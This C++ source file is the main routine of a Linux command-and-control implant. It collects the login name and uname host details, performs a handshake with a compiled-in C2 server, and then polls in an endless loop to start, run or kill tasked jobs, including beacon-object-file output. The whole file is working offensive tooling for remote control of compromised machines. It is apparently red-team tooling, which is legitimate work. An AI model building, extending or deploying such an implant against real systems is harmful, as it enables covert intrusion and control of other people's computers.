

#include "stdafx.h"
#include "ConnectionController.h"
#include "JobHunter.h"

void prepareConnection(ConnectionController* cc) {

    // Get username.
    char* username = getlogin();
    
    // Get computer information.
    struct utsname buffer;
    if (uname(&buffer) < 0) {
        cc->prepareConnection("UnknownName", username, "Linux ?");
        return;
    }

    // Put all together.
    int infoSize = 65*3;
    char info[infoSize];
    snprintf(info, infoSize, "%s %s %s", buffer.release, buffer.machine, buffer.version);

    cc->prepareConnection(buffer.nodename, username, info);
}

void loop(ConnectionController* cc, JobHunter jobHunter, OutputFormatter* of) {

    for (;;) {
        sleep(5);

        int responseCode = cc->checkNewJob();
        switch (responseCode) {
            case RESPONSE_NEW_OBJECT: {
                
                if (!jobHunter.startNewJob(cc, of)) {
                    printf("Failed to start the job!\n");
                }

                break;
            }

            case RESPONSE_NOT_INIT: {
                printf("Server didn't get our credentials!\n");
                
                int code = cc->handShake();
                if (code != RESPONSE_LOITER && code != RESPONSE_NEW_OBJECT) {
                    printf("Server gave invalid response! Exiting...\n");
                    return;
                }

                break;
            }

            case RESPONSE_KILL_JOB: {

                if (!jobHunter.killJob(cc->getJobId())) {
                    printf("Failed to kill job %s!\n", cc->getJobId().c_str());
                }

                break;
            }

            case RESPONSE_PONG: {
                break;
            }

            default: {
                printf("Error occured! Invalid response from server: %d!\n", responseCode);
                return;
            }

        }
        jobHunter.checkAllJobs(); // Update the job list.
    }

}

int main(int argc, char* argv[]) 
{
    const char* slaveId =  SLAVE_ID;

    // Check if slaveId contains Id string.
    if (strlen(SLAVE_ID) == 0) {
        slaveId = "FAKE_SLAVE_ID";
    }

    printf("Target C2 server: %s\n", C2HOST);
    printf("Slave ID: %s\n", slaveId);

    // Handles the connections.
    ConnectionController *cc = new ConnectionController(slaveId);
    OutputFormatter* of = new OutputFormatter(); // Handles the output of BOF.
    printf("Outputformatter value: %p\n",of);

    prepareConnection(cc);

    JobHunter jobHunter; // Worker pool

    // First perform handshake.
    int handshakeCode = 0;
    if ((handshakeCode = cc->handShake()) == RESPONSE_ERROR) {
        printf("Failed to perform handshake for initial connection!\n");
        return false;
    }
    else if (handshakeCode == RESPONSE_NEW_OBJECT) {
        printf("Getting init object.\n");

        // If we have an init job.
        if (!jobHunter.startNewJob(cc, of)) {
            printf("Failed to start the job!\n");
        }
    }

    loop(cc, jobHunter, of); // Forever looper.

    return 0;
}